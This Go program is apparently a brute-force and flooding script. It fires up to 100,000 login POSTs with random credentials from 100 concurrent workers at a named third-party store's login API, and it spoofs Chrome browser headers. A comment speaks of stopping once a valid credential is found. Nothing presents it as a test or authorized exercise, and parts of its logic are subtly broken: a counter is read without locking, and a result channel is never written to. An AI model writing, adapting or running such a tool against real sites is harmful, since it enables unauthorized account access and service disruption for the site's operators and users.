package main

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"math/big"
	"net/http"
	"sync"
	"time"
)

const (
	numRequests = 100000 // Total number of requests to be made
	concurrency = 100    // Number of concurrent goroutines (workers)
)

// Generate a random string of given length
func randomString(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var result []byte
	for i := 0; i < length; i++ {
		num, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			return "", err
		}
		result = append(result, charset[num.Int64()])
	}
	return string(result), nil
}

// Attempt to login with random credentials
func tryLogin(id int, requestCount *int, requestCountMutex *sync.Mutex, results chan<- string) {
	url := "https://store.cyber-safe.pro/api/login"

	for {
		// Generate random username and password
		username, _ := randomString(8)
		password, _ := randomString(8)

		// JSON payload
		jsonData := []byte(fmt.Sprintf(`{"username":"%s","password":"%s"}`, username, password))

		// Create a new HTTP POST request
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Println("Error creating request:", err)
			continue
		}

		// Set headers
		req.Header.Set("accept", "application/json, text/plain, */*")
		req.Header.Set("accept-language", "th-TH,th;q=0.9,en;q=0.8")
		req.Header.Set("content-type", "application/json")
		req.Header.Set("priority", "u=1, i")
		req.Header.Set("sec-ch-ua", `"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"`)
		req.Header.Set("sec-ch-ua-mobile", "?0")
		req.Header.Set("sec-ch-ua-platform", `"Windows"`)
		req.Header.Set("sec-fetch-dest", "empty")
		req.Header.Set("sec-fetch-mode", "cors")
		req.Header.Set("sec-fetch-site", "same-origin")
		req.Header.Set("referrer", "https://store.cyber-safe.pro/category")
		req.Header.Set("referrerPolicy", "strict-origin-when-cross-origin")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			continue
		}
		defer resp.Body.Close()

		// You can check the response body if needed
		// bodyBytes, _ := ioutil.ReadAll(resp.Body)
		// fmt.Println("Response:", string(bodyBytes))

		// Update request count
		requestCountMutex.Lock()
		*requestCount++
		requestCountMutex.Unlock()

		if *requestCount >= numRequests {
			return
		}

		time.Sleep(100 * time.Millisecond) // Avoid hammering the server too quickly
	}
}

func main() {
	results := make(chan string)
	var requestCount int
	var requestCountMutex sync.Mutex

	// Start concurrent workers
	for i := 0; i < concurrency; i++ {
		go tryLogin(i, &requestCount, &requestCountMutex, results)
	}

	// Monitor progress
	for {
		select {
		case result := <-results:
			fmt.Println(result)
			// Optionally, you can decide to exit after finding a valid credential
			// return
		case <-time.After(10 * time.Minute): // Timeout if desired
			fmt.Println("Timeout reached or completed.")
			return
		}

		if requestCount >= numRequests {
			fmt.Println("Completed all requests.")
			return
		}
	}
}
